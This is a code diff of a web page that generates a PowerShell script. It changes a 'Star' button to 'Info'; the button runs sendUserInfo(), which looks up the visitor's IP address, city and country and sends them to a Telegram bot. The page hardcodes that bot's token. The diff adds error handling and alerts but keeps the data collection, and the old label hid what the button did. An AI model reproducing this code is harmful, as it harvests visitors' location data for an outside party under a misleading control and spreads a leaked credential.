@@ -85,7 +85,7 @@
             <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
             <div id="ps-output">PowerShell Code: Click to Generate</div>
             <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
-            <button id="star-button" onclick="sendUserInfo()">Star</button>
+            <button id="info-button" onclick="sendUserInfo()">Info</button>
         </div>
     </div>
 
@@ -140,6 +140,7 @@
             // Fetch IP address and location using an external API
             try {
                 const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('Failed to fetch location data');
                 const data = await response.json();
                 userInfo.ip = data.ip || "unknown";
                 userInfo.city = data.city || "unknown";
@@ -147,6 +148,8 @@
                 userInfo.country = data.country || "unknown";
             } catch (error) {
                 console.error('Error fetching location data:', error);
+                alert('Could not retrieve location data. Please check your connection.');
+                return; // Exit the function if fetching fails
             }
 
             const token = '7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM';
@@ -168,10 +171,13 @@
                 if (data.ok) {
                     alert('Information sent to Telegram!');
                 } else {
-                    alert('Error sending information.');
+                    alert('Error sending information. Please try again later.');
                 }
             })
-            .catch(err => console.error('Error:', err));
+            .catch(err => {
+                console.error('Error:', err);
+                alert('Error sending information to Telegram. Please check your connection.');
+            });
         }
     </script>
 
